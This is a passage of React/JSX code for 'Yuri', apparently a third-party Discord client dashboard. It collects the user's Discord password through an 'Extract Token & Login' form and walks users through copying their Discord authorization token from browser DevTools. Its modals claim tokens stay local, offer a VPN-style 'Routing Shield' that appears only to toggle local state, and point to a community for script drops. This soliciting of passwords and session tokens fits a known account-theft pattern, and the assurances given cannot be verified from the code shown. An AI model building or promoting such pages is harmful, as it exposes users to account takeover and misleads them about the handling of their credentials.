                      className="w-full px-4 py-3 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Discord Password"
                      className="w-full px-4 py-3 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                  </div>

                  {copySuccess && (
                    <div className="text-emerald-400 text-xs text-center font-medium bg-emerald-500/10 py-2 px-3 rounded-lg border border-emerald-500/20 flex items-center justify-center gap-2">
                      <Check className="w-3.5 h-3.5" />
                      <span>Token extracted &amp; copied! Logging in...</span>
                    </div>
                  )}

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-red-600 hover:bg-red-500 text-white font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40 flex items-center justify-center gap-2"
                  >
                    {loading && <span className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin"/>}
                    <span>{loading ? 'Extracting & Logging in...' : 'Extract Token & Login'}</span>
                  </button>
                </form>
              ) : (
                <div className="space-y-4 text-xs text-zinc-400 bg-black/40 p-4 rounded-xl border border-white/5">
                  <p className="font-semibold text-white text-sm">How to get your Discord token:</p>
                  <ol className="list-decimal list-outside ml-4 space-y-2">
                    <li>Open Discord in your browser and sign in.</li>
                    <li>Press <code className="bg-zinc-800 text-zinc-200 px-1 py-0.5 rounded font-mono">Ctrl + Shift + I</code> to open DevTools.</li>
                    <li>Click the <span className="text-zinc-200 font-medium">Network</span> tab.</li>
                    <li>Press <code className="bg-zinc-800 text-zinc-200 px-1 py-0.5 rounded font-mono">F5</code> to reload.</li>
                    <li>Filter by <code className="bg-zinc-800 text-red-300 px-1 py-0.5 rounded font-mono">/api/v9/users/@me</code>.</li>
                    <li>Select the request and find <span className="text-zinc-200 font-medium">Authorization</span> under Request Headers.</li>
                  </ol>
                </div>
              )}

              {/* TOS Checkbox */}
              <div className="mt-6 pt-4 border-t border-white/5">
                <label className="flex items-center gap-2.5 cursor-pointer group">
                  <div className="relative flex items-center justify-center">
                    <input 
                      type="checkbox" 
                      className="sr-only" 
                      checked={termsAccepted}
                      onChange={(e) => handleAcceptTerms(e.target.checked)}
                    />
                    <div className={`w-4 h-4 rounded border flex items-center justify-center transition-all ${termsAccepted ? 'bg-red-600 border-red-600' : 'bg-black/40 border-white/20 group-hover:border-white/40'}`}>
                      {termsAccepted && <Check className="w-3 h-3 text-white" />}
                    </div>
                  </div>
                  <p className="text-[11px] text-zinc-400 select-none">
                    I agree to Yuri's <button type="button" onClick={(e) => { e.preventDefault(); setShowTermsModal(true); }} className="text-zinc-300 hover:text-white underline transition-colors">Terms of Service</button> and <button type="button" onClick={(e) => { e.preventDefault(); setShowPrivacyModal(true); }} className="text-zinc-300 hover:text-white underline transition-colors">Privacy Policy</button>.
                  </p>
                </label>
              </div>

              <div className="mt-4 text-center">
                <button
                  type="button"
                  onClick={() => setShowAuthModal(false)}
                  className="text-xs text-zinc-500 hover:text-zinc-300 transition-colors"
                >
                  ← Return to Overview
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Terms Modal */}
      <AnimatePresence>
        {showTermsModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white">Terms of Service</h3>
                <button onClick={() => setShowTermsModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 rounded-lg">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3">
                <p>
                  <strong>1. Acceptance of Terms:</strong> By accessing or using Yuri, you confirm that you have read, understood, and agreed to be bound by these Terms of Service.
                </p>
                <p>
                  <strong>2. Use of Service:</strong> Yuri is provided as a third-party application dashboard. You agree to use the service responsibly and in compliance with all applicable local, national, and international laws.
                </p>
                <p>
                  <strong>3. Interaction with Discord API and Potential Risks:</strong> Third-party clients and automation functionalities are strictly against Discord's Terms of Service. You acknowledge that you use Yuri at your entirely own personal risk.
                </p>
                <p>
                  <strong>4. Local Processing:</strong> Tokens are processed locally in your session and never stored or broadcast to remote third-party servers.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Privacy Policy Modal */}
      <AnimatePresence>
        {showPrivacyModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white">Privacy Policy</h3>
                <button onClick={() => setShowPrivacyModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 rounded-lg">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3">
                <p>
                  <strong>1. Data Collection:</strong> When you use Yuri and authenticate, your Discord token is stored entirely locally on your device within your browser's local storage or memory. We do not transmit tokens to any third-party databases.
                </p>
                <p>
                  <strong>2. Data Usage:</strong> Your tokens are strictly used to authenticate your session directly with the Discord API to enable the features within the Yuri dashboard.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* VPN Modal */}
      <AnimatePresence>
        {showVpnModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-full bg-red-500/20 flex items-center justify-center text-red-400">
                    <Globe className="w-4 h-4" />
                  </div>
                  <div>
                    <h3 className="text-sm font-semibold text-white">Yuri Routing Shield</h3>
                    <p className="text-[11px] text-zinc-400">Spoof geolocation &amp; connection node</p>
                  </div>
                </div>
                <button onClick={() => setShowVpnModal(false)} className="p-1.5 text-zinc-400 hover:text-white bg-white/5 rounded-lg">
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="p-5 space-y-3 overflow-y-auto custom-scrollbar">
                <div className="relative">
                  <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={vpnSearch}
                    onChange={(e) => setVpnSearch(e.target.value)}
                    placeholder="Search locations..."
                    className="w-full bg-zinc-900 border border-white/10 rounded-xl py-2.5 pl-9 pr-4 text-xs text-zinc-200 focus:outline-none focus:border-red-500/50"
                  />
                </div>

                <div className="space-y-1.5">
                  {VPN_COUNTRIES.filter(c => c.name.toLowerCase().includes(vpnSearch.toLowerCase()) || c.id.toLowerCase().includes(vpnSearch.toLowerCase())).map((country) => (
                    <button
                      key={country.id}
                      onClick={() => setVpnCountry(country)}
                      className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all ${
                        vpnCountry.id === country.id 
                          ? 'bg-red-500/10 border-red-500/30' 
                          : 'bg-zinc-900/60 border-transparent hover:bg-zinc-800'
                      }`}
                    >
                      <div className="flex items-center gap-2.5">
                        <span className="text-lg">{country.flag}</span>
                        <span className="text-xs font-medium text-zinc-200">{country.name}</span>
                      </div>
                      <div className="flex items-center gap-2.5">
                        <span className="text-[11px] text-zinc-500 font-mono">{country.latency}</span>
                        <div className={`w-2.5 h-2.5 rounded-full border-2 ${vpnCountry.id === country.id ? 'border-red-500 bg-red-500' : 'border-zinc-700'}`} />
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div className="p-4 border-t border-white/5 bg-zinc-900/50">
                <button
                  onClick={() => {
                    setVpnEnabled(!vpnEnabled);
                    if (!vpnEnabled) setTimeout(() => setShowVpnModal(false), 500);
                  }}
                  className={`w-full py-3 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all ${
                    vpnEnabled 
                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                      : 'bg-red-600 text-white hover:bg-red-500'
                  }`}
                >
                  <Shield className="w-4 h-4" />
                  {vpnEnabled ? 'Connected via ' + vpnCountry.name : 'Activate Node Shield'}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Community Server Modal */}
      <AnimatePresence>
        {showCommunityModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-zinc-950 border border-[#5865F2]/20 rounded-3xl shadow-2xl overflow-hidden flex flex-col relative p-6 text-center"
            >
              <button 
                onClick={() => setShowCommunityModal(false)} 
                className="absolute top-4 right-4 p-1.5 text-zinc-400 hover:text-white bg-white/5 rounded-full"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="w-16 h-16 mx-auto rounded-2xl bg-[#5865F2]/20 border border-[#5865F2]/40 flex items-center justify-center text-[#5865F2] mb-4">
                <MessageSquare className="w-8 h-8" />
              </div>

              <h3 className="text-xl font-bold text-white mb-1">Official Yuri Community</h3>
              <p className="text-xs text-zinc-400 mb-6 max-w-xs mx-auto">
                Join our private community for Lua script drops, fast-track whitelisting, and real-time announcements.
              </p>

              <button
                onClick={handleCopyCommunityLink}
                className={`w-full py-3.5 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all ${
                  communityCopied 
                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                    : 'bg-[#5865F2] text-white hover:bg-[#4752C4]'
                }`}
              >
                {communityCopied ? (
                  <>
                    <Check className="w-4 h-4 text-emerald-400" />
                    <span>Copied &amp; Opening Server!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4" />
                    <span>Copy Link &amp; Join Discord</span>
                  </>
                )}
              </button>

              <div className="mt-4 text-[11px] font-mono text-zinc-500">
                discord.gg/z5BwKZwtVe
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
